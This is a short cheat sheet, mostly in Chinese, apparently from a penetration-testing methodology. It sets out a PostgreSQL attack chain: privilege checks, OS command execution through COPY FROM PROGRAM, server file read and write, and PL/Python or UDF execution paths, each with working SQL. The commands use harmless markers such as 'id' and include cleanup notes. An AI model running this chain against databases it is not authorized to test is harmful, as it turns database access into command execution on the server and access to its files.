# PostgreSQL Direct-Service Attack Chain

---

## 1. Gate

```sql
SELECT version(), current_user;
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
SELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER') AS exec_program,
       pg_has_role(current_user,'pg_read_server_files','MEMBER') AS read_files,
       pg_has_role(current_user,'pg_write_server_files','MEMBER') AS write_files;
SELECT extname,extversion FROM pg_extension;
```

PostgreSQL 当前明确区分：

```text
pg_read_server_files   → server file read
pg_write_server_files  → server file write
pg_execute_server_program → COPY PROGRAM / server process execution
```

---

## 2. COPY PROGRAM

前提：superuser 或 `pg_execute_server_program` 等实际允许执行的权限。

```sql
CREATE TEMP TABLE sa_cmd(output text);
COPY sa_cmd FROM PROGRAM 'id';
SELECT * FROM sa_cmd;
```

`TEMP TABLE` 会随 session 清理；这是首选 marker。

成功：命令在 PostgreSQL server OS 用户上下文执行。

---

## 3. Server File Read / Write

Read 与 execute 分开：

```sql
CREATE TEMP TABLE sa_file(line text);
COPY sa_file FROM '/etc/hostname';
SELECT * FROM sa_file;
```

文件写入需要 `pg_write_server_files`/superuser 及服务器 OS 权限：

```sql
COPY (SELECT 'service-attack-marker') TO '/tmp/pg-marker.txt';
```

Cleanup：删除临时文件需要额外 primitive；否则不要写敏感目录。

---

## 4. PL/Python / Untrusted Language

```sql
SELECT * FROM pg_available_extensions WHERE name LIKE 'plpython%';
```

创建 untrusted language/extensions 通常要求 superuser。只有功能存在、权限成立时才作为 execution path；优先临时 function + `id` marker，完成后 DROP FUNCTION / DROP EXTENSION（若是本次创建）。

---

## 5. Large Object / UDF

属于环境/版本依赖 fallback：需要 server file write / large-object export + 可加载共享库 + CREATE FUNCTION 等条件。不要把它写成“所有Postgres通用”。

---

## 6. Result

记录：

```text
Postgres role
OS database account
server file capabilities
command execution primitive
extensions changed / cleanup
```
